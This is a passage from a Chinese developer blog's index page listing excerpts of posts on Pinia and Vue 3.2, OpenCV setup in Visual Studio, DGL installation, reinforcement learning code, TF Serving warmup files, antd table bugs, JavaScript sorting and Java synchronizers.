		Pinia是什么 Pinia 是 Vue 的存储库，允许您跨组件/页面共享状态。Pinia 这款产品最初是为了探索 Vuex 的下一个版本，整合了核心团队关于 Vuex 5 的许多想法。最终，我们意识到 Pinia 已经实现了我们想要在 Vuex 5 中提供的大部分内容，因此决定将其作为 新的官方推荐。
Pinia特点 足够轻量，Pinia 重约 1kb，甚至会忘记它的存在！去除 Mutation ，Actions 支持同步和异步（Actions一个顶俩，写起来简洁）；无需手动注册 Store，Store 仅需要时才自动注册。如果从不使用，则永远不会“注册”（省心）；没有模块嵌套，只有 Store 的概念，Store 之间可以自由使用，更好的代码分割；Vue2 和 Vue3 都能支持；支持大型项目迁移期间，Pinia 和 Vuex 混合使用（贴心迁移）；更完美的 typescript 的支持；与 Vue devtools 挂钩，Vue2 和 Vue3 开发体验更好；支持插件扩展功能；支持模块热更新，无需加载页面可以修改容器，可以保持任何现有的状态；支持服务端渲染； Vuex 与 Pinia 用哪个 Vuex 现在处于维护模式。它仍然可以工作，但不再添加新的功能。对于新的应用项目，建议使用 Pinia。Pinia 已经实现了我们想要在 Vuex 5 中提供的大部分内容，因此决定将其作为 新的官方推荐（注意：旧版网站没有更新）
如何使用 Pinia 一、安装 npm install pinia vue2需要另外安装 npm i pinia @vue/composition-api --save 二、定义 Store 新建 src/stores 目录并在其下面创建 index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c853d5376a0701d31e57a203cecc1ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02e27f2c7d67e9cd8f0996a30e7eeae4/" rel="bookmark">
			构建vue初始化项目 第一种方法：vue create 命令构建vue项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue create 命令构建vue项目 创建vueapp目录，用来方式 你的vue项目。
步骤：
vue create 项目名称
例如：vue create vueshop1
手动配置一下选项
进入项目
cd shopapp
启动项目
npm run serve
cd vueshop1 使用doc命令，切换进入到你的项目中
npm run serve 启动项目
在黑窗口中，选中地址文本，单击 右键（表示你在复制 这一块的文本）。
接着，打开浏览器，在地址栏，粘贴即可，打开你的vue项目。
接着，我们使用vscode，打开我们创建的vueshop1项目。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5cda0238d2f5d5723f202e95bab0409/" rel="bookmark">
			如何在VS2019中配置OpenCV(C&#43;&#43;)?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载OpenCV工具包（这一步在第一次配置opencv时完成就行）
进入OpenCV官网（网址：https://opencv.org/），点击左上角的Library，选择自己需要的版本下载，小编下载的是OpenCV-4.6.0Windows版。
依次点击“此电脑-下载”，可以查看到下载完成后的opencv-4.6.0-vc14_vc15.exe，双击该可执行文件（其实执行的就是压缩包解压过程），小编选择D盘作为保存路径，最后在D盘得到一个文件名为opencv的文件夹。
解压得到的opencv文件夹中包括以下文件：
2、设置环境变量（这一步在第一次配置opencv时完成就行）
依次点击“此电脑-属性-高级系统设计-环境变量”
在弹出界面的系统变量一栏中选中Path选项后点击新建
在弹出界面的变量名一栏填：opencv 变量值一栏填：D:\opencv\build\x64\vc15\bin，点击确定。
环境变量就设置完成了。
3、把D:\opencv\build\x64\vc15\bin路径下的opencv_videoio_ffmpeg460_64.dll，opencv_world460.dll，opencv_world460d.dll这3个文件拷贝到C:/Windows/System32文件夹中（这一步在第一次配置opencv时完成就行）。
（如果这一步没有完成，VisualStudio 2019运行代码时会跳出由于找不到opencv_world455d.dll,无法执行代码，重新安装程序可能会解决此问题）
4、Visual Studio 2019配置opencv（一个项目配置一次）
打开VS2019，点击创建新项目选项
在弹出的界面点击空项目，再点击下一步
在弹出的界面设置项目名称和存放位置，小编把项目名称设置为opencv01,项目存放在D:\C++Projects\，然后点击创建
右击项目名称选择属性
更改配置为所有配置，平台根据自己电脑选择，64位的选择×64，32位的选择×86，并且选择C++目录中的包含目录
点击最右侧的箭头，选择编辑
将下载的opencv文件夹中的头文件添加到包含目录中，小编下载的opencv头文件存放路径是D:\opencv\build\include，然后点击确定
同样的方法添加库目录，小编opencv库文件存放的路径是D:\opencv\build\x64\vc15\lib，然后点击确定
到此头文件和库文件都添加好了，点击“应用(A)”
点击“链接器-输入-添加依赖项”，将D:\opencv\build\x64\vc15\lib 文件夹下的opencv_world460d.lib 文件名复制到依赖项下，然后点击确定
然后点击应用即可
到此VS2019配置opencv步骤结束。
下面用opencv写一段简单的代码测试一下能否成功运行：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1359295d04a9d389ffea24532fa62ed3/" rel="bookmark">
			Anacoda &#43; pytorch 环境下安装 DGL_GPU
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先假设您已安装了 pytorch 虚拟环境
在 cmd 中输入命令查看 cuda 版本
nvcc --version 打开 https://www.dgl.ai/pages/start.html 选择本地 CUDA 对应的 DGL_GPU 版本
然后复制下图红框里的命令，粘贴在 pycharm 终端即可
亲测不需要再安装 GDL_CPU 版本
下面是本人踩的坑： 我刚开始先直接 pip install dgl 默认安装的 DGL_CPU 版本，但是跑起来又慢又卡
由于我的 pycharm 使用的 anacoda+pytorch 虚拟环境，因此我妄图去 anacoda 中安装 DGL_GPU
在 anacoda 命令行输入以下命令，先激活（进入）虚拟环境，再使用 conda 命令安装
#激活虚拟环境，envs_name为虚拟环境名 activate envs_name #安装 cuda 版本对应的 DGL_GPU conda install -c dglteam dgl-cuda11.1 #查看当前虚拟环境中安装了哪些包 pip list 然后 anacoda 这边显示安装好了，pip list 之后也能看到，但是 pycharm 的解释器里面就是找不到这个包。。。
无论我是 reload from disk，还是新建项目，甚至关机重启，它都执着地找不到。。。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1359295d04a9d389ffea24532fa62ed3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa0446411a50bb8651da80e916b755f6/" rel="bookmark">
			2021年CVPR论文Deep Two-View Structure-from-Motion Revisited阅读笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇博客分享的是2021年发表于CVPR上的一篇论文《Deep Two-View Structure-from-Motion Revisited》。该论文使用深度学习的方法，按照经典的SfM流程来解决两视图SfM问题。
论文地址：https://arxiv.org/abs/2104.00556v1论文代码：https://github.com/jytime/Deep-SfM-Revisited *文中出现的部分英文术语翻译&amp;理解：
ill-posed problem：病态位姿方程问题，即无法解出pose的问题up-to-scale：尺度未定的scaled：尺度确定的
1 概述 论文指出：现有的基于深度学习的方法通过从两个连续帧中恢复绝对姿势，或从单个图像预测深度图来描述该问题，这两种方法都是ill-posed问题（依据Ill-posed problems in early vision论文所述，ill-posed problem包括the recovery of motion and optical flow, shape from shading, surface interpolation, and edge detection等）。相比之下，作者建议要按照经典SfM流程来使用深度学习方法，去解决两视图SfM的问题。
论文所提出的方法包括：1. 用于预测两帧之间密集匹配的光流估计网络；2. 用于从2D光流匹配中计算相机相对位姿的归一化位姿估计模型；3. 利用对极几何约束来缩小搜索空间，精化密集匹配，并估计相对深度图的尺度不变的深度估计网络。
实验表明，论文所提出的方法在KITTI depth、KITTI VO、MVS、Scenes11和SUN3D数据集中计算相对位姿和深度估计等方面的表现都优于目前所有最先进的两视图SfM方法。
论文的贡献主要包括如下三点：
回顾了深度学习在SfM中的应用，并提出了一个新的两视图SfM深度学习框架，以解决ill-posedness。该框架结合了深度学习和经典几何方法的优点。提出了一个尺度不变的深度估计模型来处理深度真值和估计深度之间的尺度误匹配问题。所提出的方法在两视图SfM问题中对相对位姿估计和深度估计方面都优于以往的各种基准方法。 2 现有方法 作者将现有的用深度学习来解决两视图SfM的方法分为两类：
第一类方法（Figure 1 Type I）将单目相机的深度和位姿估计当成一个联合优化的问题。该类方法使用两个网络：一个网络负责从单个图像中估计up-to-scale的深度，另一个网络负责从两张输入图像中预测up-to-scale的相机位姿。这两个网络在计算时是相互独立的。比如SfMLearner、GeoNet等。另一类方法（Figure 1 Type II）从图像对中推断出scaled的相机位姿和scaled的深度，并使用多视图几何理论对其进行迭代优化。这类方法包括DeMoN、BANet、DeepV2D、DeepSFM等。 论文所提出的方法（Figure 1 Our Approach）首先使用深度光流网络估计两帧之间的密集匹配点，从中采样一组高度可靠的匹配，然后使用GPU加速的经典五点RANSAC算法计算相机的相对位姿。由于这些相机的相对位姿具有尺度不确定性，所以估计的深度也会受到尺度不确定性的影响。因此，为了用（已知尺度的）深度真值来监督估计的尺度不确定性深度，论文提出了一种结合尺度特定损失的尺度不变性深度估计网络来估计最终的相对深度图。因为有相机位姿，深度估计网络的搜索空间可以缩小为极线，因此比直接用估计的相机位姿对光流进行三角剖分具有更高的精度。
3 方法流程 3.1 Optical Flow Estimation 深度光流法可以处理大位移以及无纹理、遮挡和非朗伯曲面。论文使用最先进的网络DICL-Flow，在两个连续帧之间生成密集匹配点。该网络使用位移不变匹配代价学习策略和soft-argmin投影层来确保网络学习密集匹配点，而不是图像流的回归。该网络只需要在合成数据集上进行训练，即可应用于真实的测试数据集上。
3.2 Essential Matrix Estimation 与以前所有基于深度学习的从输入图像回归相机位姿的方法不同，论文使用匹配点来计算相机位姿。关键问题是：如何从光流中稳健地过滤掉噪声密集的匹配，以仅保留高质量的匹配？作者发现，只需简单地使用SIFT关键点位置（注意，这里不是使用SIFT进行匹配）生成mask即可在所有数据集中都获得很好的结果。该假设是，光流在纹理丰富的区域可以获得更准确的结果。mask内各位置的光流匹配由RANSAC通过GPU加速进行过滤，以避免动态物体的干扰。在获得基本矩阵E后，使用矩阵分解恢复相机姿态（R,t）。
3.3 Scale-Invariant Depth Estimation 论文提出了一种Scale-Invariant Matching方法来恢复up-to-scale的密集深度图。给定一个像点x，生成L个匹配候选点。在标准平面扫描问题中，匹配候选对象的采样分布根据比例因子α而变，如Figure 2所示。此外，由于不知道问题中的绝对尺度，论文将平移向量t进行了归一化。然后，将估计的深度d固定住，匹配候选点的分布就是尺度不变的了。最后，为了使估计深度和深度真值兼容，需要相应地对估计深度进行缩放来匹配深度真值。（由于这里不方便输入公式，因此仅使用文字进行简单描述，具体公式细节参见原论文）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa0446411a50bb8651da80e916b755f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/824d883aad752d901fe6dd693903386d/" rel="bookmark">
			vue进阶之路：vue3.2-setup语法糖、组合式API、状态库Pinia归纳总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我叫东东吖，你现在看到的是vue进阶系列，如果觉得不错，可以点赞收藏哦，喜欢我的朋友，还可以加个关注鸭。
vue进阶系列包括以下内容：
vue进阶之路：组件通信的8种方式，你搞清楚了吗？
vue进阶之路：父子组件的生命周期执行流程是怎么样的呢？
vue进阶之路：vuex五大核心概念，看完这篇文章就够了。
vue进阶之路：前端技术日新月异，vue3.0的时代已经来临...
vue进阶之路：叮，Vue2与Vue3都有哪些区别？请查收！
前言： vue3.0都没学完，vue3.2又来了，你还学得动吗？（手动滑稽）
vue3.2与vue3.0在语法上存在以下区别:
vue3.0版本：变量和方法必须return出来才能使用。
vue3.2版本：只需要在script标签上加上setup属性，不需要再把变量和方法return出去，代码更加简洁。
本文将重点将重点介绍vue3.2版本的语法，如果对vue3还没有完全接触过的小伙伴，可以先移步去我这篇文章热热身哦。 前端技术日新月异，vue3.0的时代已经来临...
创建项目： vite脚手架创建项目: vue3+vite2+ts
npm create vite@latest 一.组件结构 &lt;script setup lang="ts"&gt; //直接在script标签上添加setup属性 //... &lt;/script&gt; &lt;template&gt; //vue2只支持一个根节点，vue3支持多个根节点 //... &lt;/template&gt; &lt;style scoped&gt; // 支持CSS变量注入v-bind(color) //... &lt;/style&gt; 二.data &lt;script setup lang="ts"&gt; import { reactive, ref, toRefs } from 'vue' // ref声明响应式数据，用于声明基本数据类型 const name = ref('东东吖') // 修改 name.value = '小鲁班' // reactive声明响应式数据，用于声明引用数据类型 const state = reactive({ age: 24, sex: '男' }) // 修改 state.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/824d883aad752d901fe6dd693903386d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d8736806d2292c4ae7ffca745584ced/" rel="bookmark">
			全国大学生数学建模比赛介绍及其入门（国赛&#43;美赛）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 数学建模介绍 1.1 数学建模概念
数学建模是将实际问题转化为数学问题，通过建立数学模型、编写程序求解的过程，如某区域水资源评价问题、水利工程项目风险评价问题、水资源污染增长预测问题、快递员派送快递的最短路径问题等等。 1.2 数学模型的概念
数学模型是运用数理逻辑方法和数学语言建构的科学或工程模型，通俗的讲就是数学方法，例如初中就学过的线性规划模型，高中学过的方差分析模型、排队论、图论，大学学过的插值拟合模型、常微分方程模型等等。这些都是学过的，还有些没有学过的主要有： 层次分析法、神经网络模型、模糊数学模型、灰色系统理论模型、遗传算法模型、模拟退火算法模型。
1.3 数学建模模型的分类及其应用
数学建模模型主要分为三大类：预测模型、优化模型、评价模型。
预测模型：神经网络预测、灰色预测、拟合插值预测（线性回归）、时间序列预测、马尔科夫链预测、微分方程预测、Logistic模型等等。
应用领域：人口预测、水资源污染增长预测、病毒蔓延预测、竞赛获胜概率预测、月收入预测、销量预测、经济发展情况预测等在工业、农业、商业等经济领域，以及环境、社会和军事等领域中都有广泛的应用。
优化模型：规划模型（目标规划、线性规划、非线性规划、整数规划、动态规划）、图论模型、排队论模型、神经网络模型、现代优化算法（遗传算法、模拟退火算法、蚁群算法、禁忌搜索算法）等等。
应用领域：快递员派送快递的最短路径问题、水资源调度优化问题、高速路口收费站问题、军事行动避空侦察的时机和路线选择、物流选址问题、商区布局规划等各个领域。
评价模型：模糊综合评价法、层次分析法、聚类分析法、主成分分析评价法、灰色综合评价法、人工神经网络评价法等等。
应用领域：某区域水资源评价、水利工程项目风险评价、城市发展程度评价、足球教练评价、篮球队评价、水生态评价、大坝安全评价、边坡稳定性评价等领域。
1.4 数学建模发展介绍
最早起源于美国，即美国大学生数学建模竞赛（1985年），美赛是数学建模的鼻祖，初始只有几十支队伍参赛，后来清华大学、北京大学、复旦大学等也参加了美国赛，后来由清华大学姜启源等教授把数学建模逐渐引入国内，1992年开始举办中国大学生数学建模竞赛，1999年美国大学生数学建模竞赛有了跨学科的数学建模竞赛（与经济学、政治学、化学、生物学等学科交叉），1999年美国又开始举办了中学生数学建模竞赛，2004年中国开始举办全国研究生数学建模竞赛，2014年中国开始举办全国中学生数学建模竞赛。
1.5 竞赛流程介绍
大学生和研究生数学建模竞赛每年4月份开始下达竞赛通知，6月份开始报名，9月中旬开始竞赛，11月份公布结果、12月份举行颁奖典礼，12月末发放获奖证书。
大学生竞赛时间为三天三夜（72小时），研究生竞赛时间为四天四夜零四小时（100小时），三名学生一队，写一篇大约30页左右的数学建模赛题解决方案论文，主要内容包括：摘要、关键词、问题重述（背景+赛题介绍）、问题分析、符号说明、模型建立与求解（核心部分）、模型评价及优缺点、模型推广、参考文献、附录（数据表、图、程序代码）、附件（论文的PDF版和WORD版、画图源程序、求解源程序、EXCEL数据处理表等等）。
1.6 参加数学建模的好处
数学建模竞赛的奖项不仅仅对你考研的复试或就业面试有一定的帮助，更重要的是你在学习数学建模期间可以很好锻炼自己的科研能力。可以说一次参赛，受益终身！以下是我罗列的好处，仅供参考：
（1）评奖评优加分，在某些学校评国家奖学金和学业奖学金。
（2）参加就业面试、升学面试有优势，国家级奖项。
（3）一些地方落户加分，如上海落户加分，国家一等奖加10分，国家二等奖加8分，国家三等奖加6分。
（4）对学术科研有较大帮助，①在论文排版上有较大提高；②在数据处理能力上也有较大提高；③在数学计算、数据处理、画图软件的使用有较大的提高；④所学的数学模型能够更好的应用到发表的学术论文和硕士学位论文中，如层次分析法、模糊综合评价法等常用到工程项目评价中，遗传算法、蚁群算法等常用到水库调度、大坝裂缝监测等方面，神经网络、灰色理论等常用到人口预测预报等方面。
（5）打开我们的生活与数学之间的桥梁，而且还能学习很多非常有用的数学知识，也能锻炼逻辑思维能力。
2. 建模比赛类型及网站 2.1 全国大学生数学建模竞赛
官网网站：全国大学生数学建模竞赛
历年赛题原文网址：全国大学生数学建模竞赛
历年获奖名单：全国大学生数学建模竞赛
2.2 美国大学生数学建模竞赛
官网网站：COMAP: Mathematics Instructional Resources for Innovative Educators
历年赛题原文网址：MCM: The Mathematical Contest in Modeling
历年获奖名单：MCM: The Mathematical Contest in Modeling
2.3 中国研究生数学建模竞赛
官网网站：http://gmcm.seu.edu.cn/
历年赛题原文网址：http://gmcm.seu.edu.cn/31/list.htm
历年获奖名单：http://gmcm.seu.edu.cn/24/list.htm
3. 数学建模常用软件 数学建模与软件应用之间的关系是密不可分的，数学建模主要就是用数据说话，需要用软件对数据进行处理和计算，数学建模中最常用的软件是MATLAB软件。下面加粗为重点掌握。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d8736806d2292c4ae7ffca745584ced/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca9aa8e3d9d4cc6d850782612af236f2/" rel="bookmark">
			【动手学强化学习】DDPG&#43;HER
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		代码参考自动手学强化学习（jupyter notebook版本）：https://github.com/boyu-ai/Hands-on-RL
使用pycharm打开的请查看：https://github.com/zxs-000202/dsx-rl
理论部分 实践部分 1.定义一个简单地二维平面上的环境，在一个二维网格世界上，每个维度的位置范围时[0,5]，在每一个序列的初始，智能体都位于（0,0）的位置，环境将自动从3.5&lt;=x,y&lt;=4.5的矩形区域内生成一个目标。每个时刻智能体可以选择纵向和横向分别移动[-1,1]作为这一时刻的动作。当智能体距离目标足够近时，它将得到值为0的奖励并结束任务，否则奖励为-1。每一条轨迹的最大长度为50。
class WorldEnv: def __init__(self): self.distance_threshold = 0.15 self.action_bound = 1 def reset(self): # 重置环境 # 生成一个目标状态, 坐标范围是[3.5～4.5, 3.5～4.5] self.goal = np.array( [4 + random.uniform(-0.5, 0.5), 4 + random.uniform(-0.5, 0.5)]) self.state = np.array([0, 0]) # 初始状态 self.count = 0 return np.hstack((self.state, self.goal)) # 水平方向上拼接 def step(self, action): action = np.clip(action, -self.action_bound, self.action_bound) x = max(0, min(5, self.state[0] + action[0])) y = max(0, min(5, self.state[1] + action[1])) self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca9aa8e3d9d4cc6d850782612af236f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d1815dbb21b32b6961fd027ce179c4b/" rel="bookmark">
			生成与解析tensoflow2 tf_serving_warmup_requests
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		tensorflow模型在更新的一瞬间容易产生超时， tf-serving 中的warmup主要是通过模型启动时加载model/assets.extra/tf_serving_warmup_requests达到热启动的目的，使得模型更新时不易产生超时的问题
本文主要是讲解 tf_serving_warmup_requests的生成和反解析的过程，同时由于有些模型不需要训练，在已有模型的基础上，获取旧模型的warmup的特征，并手动给部分新特征进行预热，能够减少手动构造全部特征进行预热的繁琐工作
生成tensoflow2 tf_serving_warmup_requests 文件 def gen_warmup_file(): extra_path = 'tt/assets.extra/tf_serving_warmup_requests' feature={'a':tf.constant([[20,20],[89,90]],dtype=tf.int32), 'b':tf.constant([[3.4,3,4],[7.01,8.26]],dtype=tf.float32)} with tf.io.TFRecordWriter(extra_path) as wrriter: request = predict_pb2.PredictRequest( model_spec=model_pb2.ModelSpec(name='模型版本',signature_name='serving_default'), inputs={k:tf.make_tensor_proto(v) for k,v in feature.items()} ) log = prediction_log_pb2.PredictionLog(predict_log=prediction_log_pb2.PredictionLog(request=request)) wrriter.write(log.serializeToString()) 反解析tensoflow2 tf_serving_warmup_requests 文件 import tensorflow as tf from tensorflow_serving.apis import model_pb2 from tensorflow_serving.apis import predict_pb2 from tensorflow_serving.apis import prediction_log_pb2 def parse_warmup(warmup_file): for serized_exmple in tf.compat.v1.python_io.tf_record_iterator(warmup_file): log = prediction_log_pb2.PredictionLog() log.ParseFromString(serized_exmple) request = log.predict_log.request # 遍历request for name, tensor_ in request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d1815dbb21b32b6961fd027ce179c4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c93b94f677709f0dc126f1a05667592a/" rel="bookmark">
			antd Table组件rowSelection方法的一些坑：table组件多选时，会选中上一页或者下一页的表格同行数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;a-table :rowSelection="rowSelection" :columns="columns" :dataSource="dataSource" &gt; &lt;/a-table&gt; 在 table 组件中有 rowSelection方法，可以让Table的第一列成为联动的选择框。 API中说到通过
rowSelection.selectedRowKeys 来控制选中项。比较坑的是，selectedRowKeys
控制的只是dataSource当前的顺序编号。
需要注意的是： 一定要加上rowKey="id"或者rowKey={record =&gt; record.id}，后来经过多次调试发现很多BUG都跟这个参数有关，不然会导致联动的选择框状态异常。id可以自定义为dataSource中的某个值。
问题： 类似选中某页的几行数据，在修改、删除等操作后，其他分页的表格数据的行是选择状态，而不是我们选中的行数据。这是因为没有区分每页表格的id。
解决： &lt;a-table :rowSelection="rowSelection" :columns="columns" :dataSource="dataSource" :rowKey="row =&gt; row.id" &gt; &lt;/a-table&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4a4499f715d320662c0ac12bab2147f/" rel="bookmark">
			数据结构——排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		排序 排序就是重新排列表中的元素，使得表中的元素满足按关键字有序的过程，为了查找方便，通常希望计算机中的表是按关键字有序的。
排序定义:
输入：n个记录 R 1 , R 2 , . . . , R n R_1,R_2,...,R_n R1​,R2​,...,Rn​，对应的关键字为 k 1 , k 2 , . . . , k n k_1,k_2,...,k_n k1​,k2​,...,kn​
输出：输入序列的一个重排 R 1 ′ , R 2 ′ , . . . , R n ′ R_1',R_2',...,R_n' R1′​,R2′​,...,Rn′​，使得 k 1 ′ &lt; k 2 ′ &lt; . . . &lt; k n ′ k_1'&lt;k_2'&lt;...&lt;k_n' k1′​&lt;k2′​&lt;...&lt;kn′​（其中小于号可以换成其他符号）
算法稳定性，若待排序表中两个元素a,b其对应的关键字相同，且a在b前面，若在某一算法排序之后，a仍然在b前面(相对位置不变)，则可以说这个算法稳定，若相对位置发生改变，则算法不稳定
稳定性并能评判一个算法的优劣，主要是对算法性质描述，若一个序列中不允许重复元素出现，则稳定性的概念也就不存在了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f4a4499f715d320662c0ac12bab2147f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3ea8c7d850995fd4f668d8837d8e3ba/" rel="bookmark">
			Ant-design-vue表格禁用行复选框后点击全选依旧选中，而后面没禁用的没有选中的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ant-design-vue表格禁用行的复选框后点击全选依旧选中，而后面没禁用的没有选中，全都往上移了 &lt;a-table bordered :pagination="false" :loading="loading" :columns="columns" :dataSource="tableData" :row-selection="{ selectedRowKeys: selectedRowKeys, onChange: onSelectChange, getCheckboxProps: onGetCheckboxProps, }" &gt; &lt;/a-table&gt; 那是因为没有设置表格行 key值，所以设置表格的唯一key值就可以解决了。
设置 rowKey=“id” 或 :rowKey=“row =&gt; row.id”
&lt;a-table bordered :rowKey="row =&gt; row.id" :pagination="false" :loading="loading" :columns="columns" :dataSource="tableData" :row-selection="{ selectedRowKeys: selectedRowKeys, onChange: onSelectChange, getCheckboxProps: onGetCheckboxProps, }" &gt; &lt;/a-table&gt; 然后就解决了。。。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a1a60c14f6d3b82a6bd9cd23a7c3358/" rel="bookmark">
			你所不知道的sort方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说到快速排序，我们第一想到的一定是sort方法，但是，不要着急，在使用之前我们必须要了解sort方法到底是如何排序的。
例如： 我们对数组进行排序，我想我们的答案都是正确的。
let arr = [1,3,5,2,4] arr.sort() // [1, 2, 3, 4, 5] 再看下面这一组
let arr = [5,22,8,36,1] console.log(arr.sort()) //[1, 22, 36, 5, 8] 结果是不是和你预期的不一样呢，知其然，不知其所以然，所以今天刨根问底，一探究竟
为什么第二组排序会出现问题呢，原因如下：
1.js中的sort方法并不是按照我们数学中的1-10...,这样去依次排序的。
2.sort(默认升序)，它会将排序的元素转为字符串，所以第二组的数组转变为 ['5','25','8','36','1'],
接下对应的字符串在计算机里找对应的Unicode码。
3.Unicode编码，数字的排序方式是 先整理1开头的，然后整理2开头的，依次，所以第二组数组就会出现问题。
那么有没有解决方案呢，当然有了，
1.定义一个比较器
function(x,y) {return x-y} // 小于0，x移到y前面，大于0，移到y后面。等于0不变 let arr = [5,22,8,36,1] arr.sort(function(x,y) {return x-y})// [1, 5, 8, 22, 36] 你学会了吗，每天进步一小点，加油！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ac0f73d1f204f2abf5d89e14784b4ad/" rel="bookmark">
			多线程（三）：同步器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 同步器基础笔记 学习视频地址：https://www.bilibili.com/video/BV12L411n7Xn?share_source=copy_web
一、如何使用同步器 CountDownLatch 什么是CountDownLatch？
多个线程可以持有同一个 CountDownLatch线程的任务的 run 方法中，如果调用了 CountDownLatch 的 await 方法，则会进入等待等待 CountDownLatch 的计数递减为 0（调用了 countDown 方法），此时那些持有该 CountDownLatch 的线程会恢复继续执行任务。 二、如何使用 CountDownLatch 进行并行工作的收尾工作？ 合理安排代码逻辑将多个 A 类型线程同步后，执行 B 收尾工作线程 三、如何使用 CyclicBarrier CountDownLatch 这个同步器只能阻挡一次，即一个 task 中只能调用一次同步器的 await 方法CyclicBarrier 可以阻挡多次，即线程 task 中可以使用多次 await( ) 使用
四、线程数据交换器 Exchanger 只是拷贝一份给对方，原数据还在一般用来做数据校验 使用
五、Semaphore 信号量 是一个限流工具类像是一个许可证通过给线程发放许可证， 拿到许可证的线程才可以执行 常用的成员方法
使用
六、Phaser 阶段同步器（移相器） CyclicBarrier 的升级版CyclicBarrier 一旦指定了参与者数量，就不能再更改了Phaser 可以随时新增或减少参与同步者的数量 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9d0b3d2e91cf6e2e3d6b8ebb5c30d0f/" rel="bookmark">
			linux中无ll命令的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有时候在Linux中输入”ll”或者“ls -l”命令会弹出（ps: 这两个命令是等价的，前者是后者的简化版）
-bash: ll: command not found / -bash: ls -l : command not found 这其实是因为在环境变量中ll命令被注释掉了，只需要打开配置文件
vim ~/bashrc 或者 vi ~/bashrc 再或者 nano ~/bashrc vim /root/.bashrc 或者 vi /root/.bashrc 再或者 nano /root/.bashrc 找到这一行
# alias ll='ls $LS_OPTIONS -l' 把前面的注释"#"去掉，然后更新一下环境变量即可
. ~/.bashrc 或者 source ~/.bashrc 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d689f03982211e39d28ed73066d4eda/" rel="bookmark">
			python数据分析-微积分基础(转载）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在这个信息化时代，数据分析在各领域中发挥着越来越重要的作用。大家使用大数据技术从海量数据中挖掘信息，发现规律，探索潜在价值。在大数据的研究和应用中，数学是坚实的理论基础。在数据预处理、分析与建模、模型评价与优化等过程中，数学方法扮演着至关重要的角色。所以接下来，我们用python语言去实现微积分的一些基础计算等。常用第三方SymPy库来实现微积分计算。SymPy的全称为Symbolic Python，是由纯Python语言编写的一个用于符号运算的库，能够与其他科学计算库相结合。符号化的计算采用的是数学对象符号化的计算方式，使用数学对象的精确标识，而不是近似的，计算结果可以为一个数学表达式。它的目标在于成为一个富有特色的计算机代数系统，同时保证自身的代码尽可能简单，且易于理解，容易扩展。
一、求一元二次方程
二、集合的运算
三、 数列的极限
计算数列的极限，可以使用SymPy库的limit函数实现。语法格式如下
（获取更多知识，前往前往我的wx ————公z号 （程式解说）
原文来自https://mp.weixin.qq.com/s/yRbE0lJYXQ0ZkLP96BT75g
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a69fe03bad9ed069047e5135269f2ba5/" rel="bookmark">
			js数组去重
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
